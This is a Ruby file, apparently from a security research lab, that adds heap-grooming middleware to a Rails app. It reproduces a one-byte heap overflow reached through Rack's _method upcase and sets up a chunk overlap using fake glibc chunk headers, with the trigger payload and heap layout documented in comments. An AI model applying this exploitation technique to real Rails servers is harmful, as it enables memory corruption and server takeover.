# Stage B over HTTP — Rails port of the groom/marker pair.
#
# Installed by ruby2shell-stageB-rails-setup.sh as
# lab/build/rails-stageb-app/lib/stageb/stageb_middleware.rb with:
#   config.middleware.insert_before Rack::MethodOverride, GroomMiddleware
#   config.middleware.insert_after  Rack::MethodOverride, MarkerMiddleware
#
# Rack::MethodOverride is in the DEFAULT Rails middleware stack (see
# `bin/rails middleware`), so the sink is reachable with no app code on
# the trigger path: it upcases the `_method` form param
# (rack/method_override.rb: method.to_s.upcase), and Rack's multipart
# parser honors a per-part `charset` on text/plain parts
# (rack/multipart/parser.rb: tag_multipart_encoding -> body.force_encoding).
#
# Geometry is identical to the verified in-process/sinatra Stage B
# (lab/repro/ruby2shell-stageB.rb / -http.ru):
#   [S 0x370][V 0x430][W 0x460 live][dummy 0x360] from top after class
#   drains; free S,V,dummy + GC.start -> V in unsorted, S/dummy tcache.
#   Trigger body: multipart `_method` part "a"+0xDF*828 (N=828)
#   ISO-8859-1: buffer1 request 872 -> 0x370 pops S, ONE 0x53 byte lands
#   on V's size LSB while V sits in UNSORTED (0x431->0x453); the upcase
#   result malloc(1656) walks unsorted and bins V at 0x450.
#   MarkerMiddleware is the FIRST 0x450-class malloc after the upcase
#   (it runs immediately after Rack::MethodOverride, before
#   ActionDispatch::RequestId and everything else), so "m"*1080
#   (chunk 0x450, exact fit) takes V -> overlaps the live W object.
#   CONTROL (STAGEB_CONTROL=1 at server launch): the driver sends pure
#   0xDF*828 — same buffers, no parity flip, NO overflow.
#
# GroomMiddleware forces the multipart parse FIRST (Rack::Request#POST,
# cached in env): a parse allocation would otherwise split unsorted V
# between the groom and the upcase.
$stageb = { w_live: nil, drains: nil, readback: nil, keep: nil,
            control: !ENV['STAGEB_CONTROL'].nil? }

class GroomMiddleware
  def initialize(app)
    @app = app
  end

  def scrub
    nil
  end

  def groom!
    GC.start
    $stageb[:drains] = [
      Array.new(512) { "e" * 840 },   # request 841 -> 0x360
      Array.new(512) { "d" * 856 },   # request 857 -> 0x370
      Array.new(512) { "v" * 1048 },  # request 1049 -> 0x430
      Array.new(512) { "w" * 1096 },  # request 1097 -> 0x460
    ]
    w_content = ("W" * 16) +
                "\x50\x04\x00\x00\x00\x00\x00\x00" + # fake prev_size 0x450
                "\x90\x00\x00\x00\x00\x00\x00\x00" + # fake size 0x90, prev_inuse clear
                ("A" * 1064)
    s_chunk = "d" * 856    # S 0x370, tcache later
    v_chunk = "v" * 1048   # V 0x430, unsorted later
    $stageb[:w_live] = w_content + "" # W 0x460, stays live (copy, not COW dup)
    dummy   = "e" * 840     # 0x360, tcache later (buffer2 stock)
    v_chunk = nil; s_chunk = nil; dummy = nil; w_content = nil
    # Clobber stale stack/register slots before the sweep: without these
    # scrub calls the last-created groom string survives GC.start
    # (conservative marking of the machine stack), tcache[0x360] stays
    # unstocked and the upcase's buffer2 splits unsorted V.
    scrub; scrub; scrub
    GC.start # V -> unsorted; S -> tcache[0x370]; dummy -> tcache[0x360]
  end

  def call(env)
    if env['REQUEST_METHOD'] == 'POST' && env['PATH_INFO'] == '/trigger'
      # Force the multipart parse FIRST (env-cached; MethodOverride's
      # req.POST does not re-parse) — otherwise a parse allocation splits
      # unsorted V between the groom and the upcase.
      begin
        Rack::Request.new(env).POST
      rescue StandardError
      end
      groom!
    end
    @app.call(env)
  end
end

class MarkerMiddleware
  def initialize(app)
    @app = app
  end

  def call(env)
    if env['REQUEST_METHOD'] == 'POST' && env['PATH_INFO'] == '/trigger'
      ov = "m" * 1080        # malloc(1081): chunk 0x450 exact fit -> V
      $stageb[:readback] = $stageb[:w_live].byteslice(0, 32).unpack1('H*')
      $stageb[:keep] = ov     # keep live: freeing it would munmap-abort
    end
    @app.call(env)
  end
end
